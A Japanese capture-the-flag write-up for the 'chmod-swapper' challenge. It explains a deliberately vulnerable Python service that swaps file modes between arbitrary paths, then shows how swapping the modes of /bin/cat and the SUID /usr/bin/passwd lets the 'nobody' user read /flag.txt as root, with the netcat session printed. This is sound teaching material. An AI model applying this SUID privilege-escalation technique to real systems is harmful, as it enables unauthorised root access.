---
title: Daily-AlpacaHack 「chmod-swapper」Medium Writeup
description: 任意ファイルに対する権限スワップ
date: 2026-06-11 10:13:00 +0900
categories: [CyberSecurity, CTF]
tags: [daily_alpaca_hack, misc, vuln/arbitrary_file_permission_modification]
---

# 20260610-daily_alpaca-misc-medium-chmod_swapper

## Summary

本問は，任意のファイル同士で権限をスワップできる機能と `SUID` の特性を悪用し，任意ファイル読み取りを行う問題です．

> - **Category**: Misc
> - **Description**: chmodでswapしてみたくない？
> - **Tools & TechStack**:
> 	- Python
> - **Release**: 2026/06/10
{: .prompt-info }

**階層構造**
```
.
├── compose.yaml
├── Dockerfile
├── flag.txt
└── server.py

1 directory, 4 files
```

---
## ソースコードの調査

ソースコードを読み，全体の動作フローを調べました．
最初はパストラバーサルを疑いましたが，`resolve()` が使用されていたため別の手法を探しました．

1. 入力AとBを受け入れる．
2. 各パスが `resolve()` によってシンボリックリンク解決され，絶対パスへ正規化される．
3. `a_path` と `b_path` が，`BANNED_PATHS[]` に含まれているディレクトリ以下に存在しないことをチェックする (`is_relative_to()`[^1] での判定は文字列ベースであり，実際のファイルI/Oを用いない)．
4. チェック後の `a`，`b` ファイルの権限を取得し，交換する．
5. `subprocess.run()` を用いて，`runuser` でインタラクティブなシェルを起動する．

```shell
import subprocess
import sys
from pathlib import Path

BANNED_PATHS = ["/dev", "/proc", "/run/lock", "/tmp", "/var/tmp", "/flag.txt"]

def is_banned(path):
    # is_relative_to() は，文字列ベースで判定し，pathがbanned以下にあれば True
    # 
    return any(path.is_relative_to(banned) for banned in BANNED_PATHS)

print("Enter two paths. I will swap the file modes of A and B.")
# resolve()はシンボリックリンクを解決し，絶対パスに正規化する
a_path = Path(input("A> ")).resolve()
b_path = Path(input("B> ")).resolve()
print(a_path, b_path)

# a,bのどちらか一方でも，pathがBANNED_PATHSに含まれていれば弾く
if is_banned(a_path) or is_banned(b_path):
    print("Not permitted")
    sys.exit(1)

# aとbの権限を交換する
a_mode = a_path.stat().st_mode
b_mode = b_path.stat().st_mode

a_path.chmod(b_mode)
b_path.chmod(a_mode)

subprocess.run(["runuser", "-u", "nobody", "--", "sh", "-i"])
```

任意のファイル間で，そのファイル権限を入れ替えられるという **LPE** に繋がりそうな実装がされています．
重要な点として，最後に `subprocess.run(["runuser", "-u", "nobody", "--", "sh", "-i"])` でインタラクティブシェルを起動しています．
ここで，特権ファイルの権限と `cat` バイナリの権限をスワップすることが可能であれば，後のシェルで特権を用いてファイルを見ることができると考えました．

## `SUID (Set User ID)`

`SUID`[^2] が設定されているファイルを探すと，`/usr/bin/passwd` が該当することが分かりました．
`/usr/bin/passwd` は基本的に `root` が所有者であり，かつ `SUID` が設定されています．そのため，だれが実行しても特権で操作することが可能です．

- **A**: `/bin/cat`，`root` 所有
- **B**: `/usr/bin/passwd`，`root` 所有
- AとBの権限をスワップし，`/bin/cat` に `SUID` を付けることで，どのファイルも `cat` 可能になる．

```shell
$ nc 34.170.146.252 58837
Enter two paths. I will swap the file modes of A and B.
A> /bin/cat
B> /usr/bin/passwd
sh: 0: can't access tty; job control turned off
$ /bin/cat /flag.txt
Alpaca{REDACTED}
```

---
## Post-Mortem & Dead ends

1. `subprocess.run(...)`
Pythonの標準ライブラリである `subprocess` モジュールの関数．指定されたリストを **OSのコマンドとして実行し，そのコマンドが終了するまで待機** する．

2. `runuser`
ユーザーを切り替えてコマンドを実行するためのコマンド．`su` コマンドとほぼ同じですが，パスワードを要求しないことや．主にrootユーザーが他のユーザー権限でスクリプトを実行する際によく使われる．(このスクリプト自体が権限スワップのために，root等の高権限で動いている証拠でもある)

### `UID` と `EUID` の違い

- **UID (Real User ID)**: コマンドを実行した実際のユーザー (今回の場合は `nobody`)
- **EUID (Effective User ID)**: OSがファイルアクセス権限をチェックする際に参照するユーザー (SUIDが付いた `cat` を実行したため `root` になる)

今回は，`SUID` が付与されたことで，`cat` 実行時の `EUID` が `root` になり，`nobody` ユーザーのままでも `root` 権限で `/flag.txt` が読めるようになった．

## References

[^1]: [pathlib — Object-oriented filesystem paths — Python 3.14.5 documentation](https://docs.python.org/3/library/pathlib.html#pathlib.PurePath.is_relative_to)

[^2]: [Linux permissions: SUID, SGID, and sticky bit](https://www.redhat.com/en/blog/suid-sgid-sticky-bit)
